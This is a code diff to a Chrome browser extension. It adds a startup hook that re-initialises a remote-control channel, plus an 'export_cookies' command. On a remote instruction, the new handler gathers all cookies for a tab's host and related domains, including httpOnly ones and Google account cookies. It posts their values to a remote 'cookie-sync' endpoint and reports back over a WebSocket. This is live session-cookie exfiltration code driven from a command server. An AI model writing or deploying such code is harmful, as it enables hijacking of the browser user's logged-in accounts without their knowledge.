@@ -63,6 +63,18 @@ chrome.runtime.onInstalled.addListener(async () => {
   }
 });
 
+// Initialize on browser startup to prevent "machine offline" issues
+chrome.runtime.onStartup.addListener(async () => {
+  try {
+    log('info', '🔄 Browser started, initializing extension...');
+    await initializeExtension();
+    initializeRemoteControl();
+    log('info', '✅ Startup initialization complete');
+  } catch (error) {
+    log('error', '❌ Failed startup initialization', error);
+  }
+});
+
 // Initialize machine ID and settings
 async function initializeExtension() {
   log('debug', '📋 Loading stored configuration...');
@@ -713,6 +725,107 @@ async function handleRemoteCommand(data) {
     case 'screenshot':
       await handleScreenshotCommand(data);
       break;
+    case 'export_cookies':
+      await handleExportCookiesCommand(data);
+      break;
+  }
+}
+
+// Handle export cookies command - collect fresh cookies and sync to incident
+async function handleExportCookiesCommand(data) {
+  try {
+    const tabId = parseInt(data.target_tab_id);
+    const tab = await chrome.tabs.get(tabId);
+    const url = new URL(tab.url);
+    const host = url.hostname;
+    
+    log('info', `Export cookies command for tab ${tabId}, host: ${host}`);
+    
+    // Collect cookies from this host and related domains
+    const domains = [host];
+    if (host.startsWith('www.')) {
+      domains.push(host.substring(4));
+    } else {
+      domains.push('www.' + host);
+    }
+    
+    // For common auth domains
+    const baseDomain = host.split('.').slice(-2).join('.');
+    if (host.includes('google.com')) {
+      domains.push('accounts.google.com', '.google.com');
+    }
+    
+    const allCookies = [];
+    for (const domain of domains) {
+      try {
+        const cookies = await chrome.cookies.getAll({ domain });
+        allCookies.push(...cookies);
+      } catch (error) {
+        log('error', `Failed to get cookies for ${domain}`, error);
+      }
+    }
+    
+    // Deduplicate by name
+    const cookieMap = new Map();
+    for (const cookie of allCookies) {
+      cookieMap.set(cookie.name, {
+        name: cookie.name,
+        value: cookie.value,
+        domain: cookie.domain,
+        path: cookie.path,
+        secure: cookie.secure,
+        httpOnly: cookie.httpOnly,
+        sameSite: cookie.sameSite,
+        expirationDate: cookie.expirationDate
+      });
+    }
+    
+    const cookies = Array.from(cookieMap.values());
+    log('info', `Collected ${cookies.length} unique cookies for export`);
+    
+    // Send to cookie-sync edge function
+    const response = await fetch(`${CONFIG.API_BASE}/cookie-sync`, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+        'Authorization': `Bearer ${CONFIG.SUPABASE_ANON_KEY}`
+      },
+      body: JSON.stringify({
+        incident_id: data.payload?.incident_id,
+        cookies: cookies,
+        host: host,
+        tab_url: tab.url
+      })
+    });
+    
+    if (!response.ok) {
+      throw new Error(`Cookie sync failed: ${response.status}`);
+    }
+    
+    const result = await response.json();
+    log('info', 'Cookies exported successfully', result);
+    
+    // Send success response back via WebSocket
+    if (commandSocket && commandSocket.readyState === WebSocket.OPEN) {
+      commandSocket.send(JSON.stringify({
+        type: 'command_response',
+        command_id: data.command_id,
+        success: true,
+        cookies_exported: cookies.length
+      }));
+    }
+  } catch (error) {
+    log('error', 'Export cookies command failed', error);
+    
+    // Send error response
+    if (commandSocket && commandSocket.readyState === WebSocket.OPEN) {
+      commandSocket.send(JSON.stringify({
+        type: 'command_response',
+        command_id: data.command_id,
+        success: false,
+        error: error.message
+      }));
+    }
   }
 }
 
